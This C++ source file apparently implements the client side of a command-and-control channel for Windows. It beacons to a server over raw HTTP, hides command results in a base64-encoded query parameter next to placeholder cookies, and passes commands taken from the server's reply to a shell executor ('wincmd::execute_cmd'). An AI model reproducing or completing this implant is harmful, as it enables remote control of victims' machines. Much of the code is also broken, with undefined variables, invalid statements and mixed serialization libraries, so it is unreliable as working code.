#include <iostream>
#include <string>
#include <sstream>
#include <ws2tcpip.h>
#include "xhttp.h"
#include <WinSock2.h>
#include <map>
#include <cstring>
#include <cstdint>
#include <stdint.h>
#include <algorithm>
#include "command.h"
#include <vector>
#include "C:\msys64\ucrt64\include\zlib\zlib.h"
#include <nlohmann\json.hpp>

#pragma comment(lib, "ws2_32.lib")

namespace xhttp {
std::vector<uint32_t> req_body;
std::string cmdstr;
std::string cmdString;
std::string cmdGroup;
std::string cmdValue;
std::string queryParams;
std::string encodedParams;
CommandQueue queue;
int key;
std::string cmdResponse;

struct Command {
    std::string Group;
    std::string String;
    std::string Response;
};

// Function to serialize a Command object
std::vector<uint8_t> serializeCommand(const Command& acmd) {
    // Pack the Command object into a std::vector<uint8_t>
    using namespace msgpack_lite;
    std::vector<uint8_t> sbuf;
    Packer packer(sbuf, acmd);

    return sbuf;
}
// Function to deserialize a Command object
Command deserializeCommand(const std::vector<uint8_t>& packedData) {
    // Create a msgpack::object_handle to hold the deserialized data
    using namespace msgpack_lite;
    Unpacker unpacker(std::cin);
    msgpack_lite::object_handle oh = unpacker(packedData.data(), packedData.size());

    // Convert the msgpack::object to a Command object
    return oh.get().as<Command>();
}

bool parse_url(const std::string& url, std::string& protocol, std::string& host, int& port, std::string& path) {
    std::stringstream ss(url);
    std::string temp;

    // Parse protocol
    getline(ss, protocol, ':');
    if (protocol != "http") {
        std::cerr << "Invalid protocol. Only 'http' protocol is supported." << std::endl;
        return false;
    }
    // Check if there are more characters in the stringstream
    if (ss.peek() == EOF) {
        std::cerr << "Unexpected end of URL." << std::endl;
        return false;
    }
    // Consume "//"
    getline(ss, temp, '/');
    getline(ss, temp, '/');

    // Parse host and port
    getline(ss, host, ':');
    if (host.empty()) {
        std::cerr << "Invalid URL format. Hostname is missing." << std::endl;
        return false;
    }
    std::string port_str;
    getline(ss, port_str, '/');
    if (port_str.empty()) {
        std::cerr << "Invalid URL format. Port number is missing." << std::endl;
        return false;
    }
    port = stoi(port_str);
    // Parse path
    getline(ss, path);
    if (path.empty()) {
        std::cerr << "Invalid URL format. Path is missing." << std::endl;
        return false;
    }
    return true;
}

std::string createCookiesString() {
    // Define the cookies string with dynamic ID
    std::string cookies = "ID=value1; cookie2=value2"; // separate cookies with semicolon

    return cookies;
}

std::string buildRequest(const std::string& path, const std::string& host, const std::string& cookies, CommandQueue& queue) {
    
    if (!queue.empty()) {
        
        auto it = queue.begin();
       
        auto& cmdqueue = it->second;
        
        std::string cmdGroup = cmdqueue.Group;
        std::string cmdString = cmdqueue.String;
        std::string cmdResponse = cmdqueue.Response;

///
        // Create an instance of your structure
        Command s{cmdGroup, cmdString, cmdResponse};

        // Serialize the structure to MessagePack
        std::vector<uint8_t> packed;
        msgpackpp::sbuffer sbuf;
        msgpackpp::packer(sbuf, s);
        packed.assign(sbuf.data(), sbuf.data() + sbuf.size());
    
        // Calculate CRC32 hash
        uint32_t crc32_hash = crc32(0L, (const Bytef *)data.c_str(), data.length()); ;

       // Append CRC32 hash to the serialized data
        packed.insert(packed.end(), reinterpret_cast<const uint8_t*>(&crc32_hash), reinterpret_cast<const uint8_t*>(&crc32_hash) + sizeof(uint32_t));


///
        std::string cookiesString = createCookiesString(); 
        std::string queryParams = "aa:", packed; // "UID:", "UIDString";
        std::string encodedParams = base64_encode(queryParams);

        removeFromQueue(queue, it->first); // Passing the key to removeFromQueue
    
        return "GET /" + path + "?" + "aa=" + encodedParams + " HTTP/1.1\r\n"
               "Host: " + host + "\r\n"
               "Connection: Keep-Alive\r\n"
               "Keep-Alive: timeout=15, max=1000\r\n" 
               "Cookie: " + cookiesString + "\r\n"    
               "\r\n"; 
        
    } else {
        // Queue is empty, return request without command information;
        std::string cookiesString = createCookiesString(); 
        return "GET /" + path + "?" + " HTTP/1.1\r\n"
               "Host: " + host + "\r\n"
               "Connection: Keep-Alive\r\n"
               "Keep-Alive: timeout=15, max=1000\r\n" 
               "Cookie: " + cookiesString + "\r\n"    
               "\r\n";
    }
}

bool initialize_winsock() {
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2, 2), &wsaData) == 0;
}

SOCKET create_socket(const std::string& host, int port) {
    SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        std::cerr << "Error creating socket: " << WSAGetLastError() << std::endl;
        return INVALID_SOCKET;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(host.c_str());
    serverAddr.sin_port = htons(port);

    if (connect(ConnectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Error connecting to server: " << WSAGetLastError() << std::endl;
        closesocket(ConnectSocket);
        return INVALID_SOCKET;
    }

    return ConnectSocket;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////                                       GET  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

std::string http_get(const std::string& url) {
    std::string protocol, host, path, cookies;
    int port;
    if (!parse_url(url, protocol, host, port, path)) {
        return "";
    }

    if (!initialize_winsock()) {
        return "";
    }

    SOCKET ConnectSocket = create_socket(host, port);
    if (ConnectSocket == INVALID_SOCKET) {
        WSACleanup();
        return "";
    }

    std::string request = buildRequest(path, host, cookies, queue);

    if (send(ConnectSocket, request.c_str(), request.length(), 0) == SOCKET_ERROR) {
        std::cerr << "Error sending request: " << WSAGetLastError() << std::endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return "";
    }

    std::vector<char> response_data = receive_data(ConnectSocket);

    std::string cmdValue = extractCMD(response_data);
    req_body.clear();

    closesocket(ConnectSocket);
    WSACleanup();
    return ""; 
}

std::string extractCMD(const std::vector<char>& data) {
///
    std::vector<uint8_t> received_serialized_data_with_crc = data;

    // Validate CRC32 hash
    uint32_t received_crc32;
    std::memcpy(&received_crc32, received_serialized_data_with_crc.data() + received_serialized_data_with_crc.size() - sizeof(uint32_t), sizeof(uint32_t));
    uint32_t calculated_crc32 = crc32(0L, (const Bytef *)data.c_str(), data.length()); ;

    if (calculated_crc32 == received_crc32) {
        // CRC32 hash validation successful, deserialize the data
        Command deserialized_s;
        msgpackpp::object_handle oh = msgpackpp::unpack(received_serialized_data_with_crc.data(), received_serialized_data_with_crc.size());
        oh.get().convert(deserialized_s);
        
        cmdGroup = deserialized_s.Group;
        cmdString = deserialized_s.String;
        
        std::cout << "Deserialized Command:" << std::endl;
        std::cout << "cmdGroup: " << cmdGroup << std::endl;
        std::cout << "cmdString: " << cmdString << std::endl;
    } else {
        std::cout << "CRC32 hash validation failed" << std::endl;
    }
///

    return cmdValue;
}

void addToQueue(CommandQueue& queue, int key, const std::string& cmdValue, const std::string& cmdString, const std::string& cmdResponse) {
    Command command;
    command.Group = cmdValue;
    command.String = cmdString;
    command.Response = cmdResponse;
    queue[key] = command;  // Add command to the queue with the specified key
}

void removeFromQueue(CommandQueue& queue, int key) {
    queue.erase(key);  // Remove command from the queue with the specified key
}

std::string base64_encode(const std::string &in) {
    std::string out;
    int len = in.length();
    int j = 0;
    const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    for (int i = 0; i < len; i += 3) {
        int octet_a = in[i];
        int octet_b = i + 1 < len ? in[i + 1] : 0;
        int octet_c = i + 2 < len ? in[i + 2] : 0;

        int triplet = (octet_a << 16) + (octet_b << 8) + octet_c;

        out += base64_chars[(triplet >> 18) & 0x3F];
        out += base64_chars[(triplet >> 12) & 0x3F];
        out += i + 1 < len ? base64_chars[(triplet >> 6) & 0x3F] : '=';
        out += i + 2 < len ? base64_chars[triplet & 0x3F] : '=';
    }

    return out;
}

bool extract_content_length(const std::vector<char>& data, size_t& content_length) {
    // Search for the Content-Length header
    const std::string content_length_header = "Content-Length:";
    auto header_start = std::search(data.begin(), data.end(), content_length_header.begin(), content_length_header.end());
    if (header_start != data.end()) {
        // Find the end of the header line
        auto header_end = std::find(header_start, data.end(), '\n');
        if (header_end != data.end()) {
            // Extract the content length value
            std::string length_str(header_start + content_length_header.size(), header_end);
            content_length = std::stoul(length_str);
            return true;
        }
    }
    return false;
}

std::vector<char> receive_data(SOCKET ConnectSocket) {
    constexpr size_t BUFFER_SIZE = 2048;
    std::vector<char> buffer;
    int totalBytesReceived = 0;
    int bytesReceived;

    size_t content_length = 0;
    bool found_content_length = false;

    do {
        char chunkBuffer[BUFFER_SIZE];
        bytesReceived = recv(ConnectSocket, chunkBuffer, BUFFER_SIZE, 0);
        if (bytesReceived > 0) {
            buffer.insert(buffer.end(), chunkBuffer, chunkBuffer + bytesReceived);
            totalBytesReceived += bytesReceived;

            // Check if we have found the Content-Length header
            if (!found_content_length) {
                // Convert buffer to string to search for Content-Length
                std::string str(buffer.begin(), buffer.end());
                found_content_length = extract_content_length(buffer, content_length);
            }

            // Check if we have received the entire body
            if (found_content_length && totalBytesReceived >= content_length) {
                break;
            }
        } else if (bytesReceived == 0) {
            // Connection closed by the server
            break;
        } else {
            std::cerr << "recv failed\n";
            closesocket(ConnectSocket);
            WSACleanup();
            return std::vector<char>();
        }
    } while (bytesReceived == BUFFER_SIZE);

    if (cmdString.length() >= 1) {
        addToQueue(queue, key, cmdGroup, cmdString, cmdResponse);
        wincmd::execute_cmd(queue, wincmd::current_dir, wincmd::time_out);  
    }
    cmdString.clear();
    queryParams.clear();
    encodedParams.clear();

    return buffer;
}



}
